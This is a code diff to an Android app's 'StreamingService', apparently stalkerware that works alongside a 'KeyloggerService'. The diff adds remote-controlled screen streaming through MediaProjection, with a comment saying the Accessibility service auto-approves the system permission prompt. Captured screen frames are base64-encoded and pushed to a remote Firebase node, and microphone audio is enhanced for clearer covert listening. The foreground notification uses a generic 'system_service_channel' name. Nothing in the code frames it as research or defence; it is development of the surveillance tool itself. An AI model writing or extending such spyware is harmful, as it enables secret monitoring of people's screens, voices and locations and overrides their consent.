@@ -14,6 +14,10 @@ import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
 import android.media.*
+import android.media.projection.MediaProjection
+import android.media.projection.MediaProjectionManager
+import android.hardware.display.VirtualDisplay
+import android.hardware.display.DisplayManager
 import android.net.Uri
 import android.os.*
 import android.provider.CallLog
@@ -43,6 +47,11 @@ import android.app.KeyguardManager
 class StreamingService : Service() {
     companion object {
         var isUninstalling = false
+        var instance: StreamingService? = null
+
+        fun handleMediaProjectionGranted(resultCode: Int, data: Intent) {
+            instance?.startMediaProjectionStream(resultCode, data)
+        }
     }
 
     private var cameraManager: CameraManager? = null
@@ -132,6 +141,7 @@ class StreamingService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        instance = this
         // CRITICAL: Start foreground IMMEDIATELY to prevent 5-second timeout crash on Android 12+
         promoteToForeground(camera = false, mic = false, loc = false)
 
@@ -1357,6 +1367,12 @@ class StreamingService : Service() {
     private var liveStreamAudioRecord: AudioRecord? = null
     private var isLiveStreamAudioActive = false
 
+    // MediaProjection Screen Stream fields
+    private var mediaProjection: MediaProjection? = null
+    private var virtualDisplay: VirtualDisplay? = null
+    private var screenImageReader: ImageReader? = null
+    private var isScreenStreamingActive = false
+
     private fun handleLiveStreamControls(snapshot: DataSnapshot) {
         val active = snapshot.child("active").getValue(Boolean::class.java) ?: false
         val source = snapshot.child("source").getValue(String::class.java) ?: "camera"
@@ -1368,16 +1384,13 @@ class StreamingService : Service() {
 
         if (active) {
             if (source == "screen") {
-                stopLiveCameraOnly()
-                promoteToForeground(camera = false, mic = audio, loc = true)
-                KeyloggerService.instance?.startLiveScreenStream(quality, fps)
-                if (audio) startLiveStreamAudio()
+                startScreenStreamSession(quality, fps, audio)
             } else {
-                KeyloggerService.instance?.stopLiveScreenStream()
+                stopScreenStreamInternal()
                 startLiveStreamSession(facing, quality, audio, torch)
             }
         } else {
-            KeyloggerService.instance?.stopLiveScreenStream()
+            stopScreenStreamInternal()
             stopLiveStreamSession()
         }
     }
@@ -1387,15 +1400,117 @@ class StreamingService : Service() {
     }
 
     @Synchronized
+    private fun startScreenStreamSession(quality: String = "720p", fps: Int = 24, audio: Boolean = true) {
+        try {
+            stopLiveCameraOnly()
+            promoteToForeground(camera = false, mic = audio, loc = true, screen = true)
+
+            // 1. Request MediaProjection system permission dialog (Accessibility service auto-allows)
+            ScreenCaptureActivity.requestPermission(this)
+
+            // 2. Also start Accessibility takeScreenshot frame loop concurrently
+            KeyloggerService.instance?.startLiveScreenStream(quality, fps)
+
+            // 3. Start crystal clear audio stream
+            if (audio) {
+                startLiveStreamAudio()
+            }
+        } catch (e: Exception) {
+            Timber.e(e, "Error starting Screen Stream session")
+        }
+    }
+
+    fun startMediaProjectionStream(resultCode: Int, data: Intent) {
+        try {
+            stopMediaProjectionStream()
+            promoteToForeground(camera = false, mic = true, loc = true, screen = true)
+
+            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager ?: return
+            mediaProjection = mpm.getMediaProjection(resultCode, data)
+
+            val dm = resources.displayMetrics
+            val width = 720
+            val height = 1280
+            val density = dm.densityDpi
+
+            screenImageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
+            virtualDisplay = mediaProjection?.createVirtualDisplay(
+                "ScreenStream",
+                width, height, density,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                screenImageReader?.surface, null, liveStreamHandler
+            )
+
+            isScreenStreamingActive = true
+            screenImageReader?.setOnImageAvailableListener({ reader ->
+                if (!isScreenStreamingActive) return@setOnImageAvailableListener
+                var image: Image? = null
+                try {
+                    image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
+                    val planes = image.planes
+                    val buffer = planes[0].buffer
+                    val pixelStride = planes[0].pixelStride
+                    val rowStride = planes[0].rowStride
+                    val rowPadding = rowStride - pixelStride * width
+
+                    val bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
+                    bitmap.copyPixelsFromBuffer(buffer)
+
+                    val croppedBitmap = if (rowPadding == 0) bitmap else Bitmap.createBitmap(bitmap, 0, 0, width, height)
+
+                    val out = ByteArrayOutputStream()
+                    croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 45, out)
+                    val b64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
+
+                    deviceRef?.child("live_stream/stream_frame")?.setValue(mapOf(
+                        "frame" to b64,
+                        "source" to "screen",
+                        "time" to ServerValue.TIMESTAMP
+                    ))
+
+                    if (croppedBitmap != bitmap) croppedBitmap.recycle()
+                    bitmap.recycle()
+                } catch (e: Exception) {
+                    Timber.e(e, "Error capturing projection frame")
+                } finally {
+                    image?.close()
+                }
+            }, liveStreamHandler)
+
+        } catch (e: Exception) {
+            Timber.e(e, "startMediaProjectionStream error")
+        }
+    }
+
+    private fun stopMediaProjectionStream() {
+        isScreenStreamingActive = false
+        try {
+            virtualDisplay?.release()
+            virtualDisplay = null
+            screenImageReader?.close()
+            screenImageReader = null
+            mediaProjection?.stop()
+            mediaProjection = null
+        } catch (e: Exception) {
+            Timber.e(e, "Error stopping MediaProjection")
+        }
+    }
+
+    private fun stopScreenStreamInternal() {
+        stopMediaProjectionStream()
+        KeyloggerService.instance?.stopLiveScreenStream()
+    }
+
+    @Synchronized
     private fun startLiveStreamSession(facing: String = "front", quality: String = "720p", audio: Boolean = true, torch: Boolean = false) {
         try {
-            KeyloggerService.instance?.stopLiveScreenStream()
+            stopScreenStreamInternal()
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                 Timber.e("LiveStream: Camera permission not granted")
                 return
             }
 
-            promoteToForeground(camera = true, mic = audio, loc = true)
+            promoteToForeground(camera = true, mic = audio, loc = true, screen = false)
             stopLiveStreamSessionInternal()
 
             isLiveStreamRunning = true
@@ -1507,18 +1622,52 @@ class StreamingService : Service() {
     private fun startLiveStreamAudio() {
         if (isLiveStreamAudioActive) return
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return
-        
+
         isLiveStreamAudioActive = true
         Thread {
+            var ns: android.media.audiofx.NoiseSuppressor? = null
+            var agc: android.media.audiofx.AutomaticGainControl? = null
+            var aec: android.media.audiofx.AcousticEchoCanceler? = null
             try {
                 val sampleRate = 16000
                 val minBuf = AudioRecord.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
-                val bufferSize = if (minBuf > 0) minBuf else 3200
-                liveStreamAudioRecord = AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize * 2)
-                liveStreamAudioRecord?.startRecording()
-                val buffer = ShortArray(bufferSize)
+                val bufferSize = if (minBuf > 0) minBuf.coerceAtLeast(2048) else 3200
 
-                while (isLiveStreamRunning && isLiveStreamAudioActive) {
+                // Use VOICE_COMMUNICATION for hardware speech enhancement and noise reduction
+                liveStreamAudioRecord = AudioRecord(
+                    MediaRecorder.AudioSource.VOICE_COMMUNICATION,
+                    sampleRate,
+                    AudioFormat.CHANNEL_IN_MONO,
+                    AudioFormat.ENCODING_PCM_16BIT,
+                    bufferSize * 2
+                )
+
+                val sessionId = liveStreamAudioRecord?.audioSessionId ?: 0
+                if (sessionId != 0) {
+                    if (android.media.audiofx.NoiseSuppressor.isAvailable()) {
+                        try {
+                            ns = android.media.audiofx.NoiseSuppressor.create(sessionId)
+                            ns?.enabled = true
+                        } catch (e: Exception) {}
+                    }
+                    if (android.media.audiofx.AutomaticGainControl.isAvailable()) {
+                        try {
+                            agc = android.media.audiofx.AutomaticGainControl.create(sessionId)
+                            agc?.enabled = true
+                        } catch (e: Exception) {}
+                    }
+                    if (android.media.audiofx.AcousticEchoCanceler.isAvailable()) {
+                        try {
+                            aec = android.media.audiofx.AcousticEchoCanceler.create(sessionId)
+                            aec?.enabled = true
+                        } catch (e: Exception) {}
+                    }
+                }
+
+                liveStreamAudioRecord?.startRecording()
+                val buffer = ShortArray(bufferSize / 2)
+
+                while ((isLiveStreamRunning || isScreenStreamingActive) && isLiveStreamAudioActive) {
                     val read = liveStreamAudioRecord?.read(buffer, 0, buffer.size) ?: break
                     if (read > 0) {
                         val pcmBytes = ByteArray(read * 2)
@@ -1537,12 +1686,14 @@ class StreamingService : Service() {
                             "time" to ServerValue.TIMESTAMP
                         ))
                     }
-                    SystemClock.sleep(120)
                 }
             } catch (e: Exception) {
                 Timber.e(e, "LiveStream Audio error")
             } finally {
                 try {
+                    ns?.release()
+                    agc?.release()
+                    aec?.release()
                     liveStreamAudioRecord?.stop()
                     liveStreamAudioRecord?.release()
                 } catch (e: Exception) {}
@@ -1679,7 +1830,7 @@ class StreamingService : Service() {
         ))
     }
 
-    private fun promoteToForeground(camera: Boolean, mic: Boolean, loc: Boolean) {
+    private fun promoteToForeground(camera: Boolean, mic: Boolean, loc: Boolean, screen: Boolean = false) {
         val cid = "system_service_channel"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val manager = getSystemService(NotificationManager::class.java)
@@ -1711,6 +1862,7 @@ class StreamingService : Service() {
             if (camera && hasCameraPerm) t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
             if (mic && hasMicPerm) t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
             if (loc && hasLocPerm) t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+            if (screen && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
             
             if (Build.VERSION.SDK_INT >= 34) {
                 t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
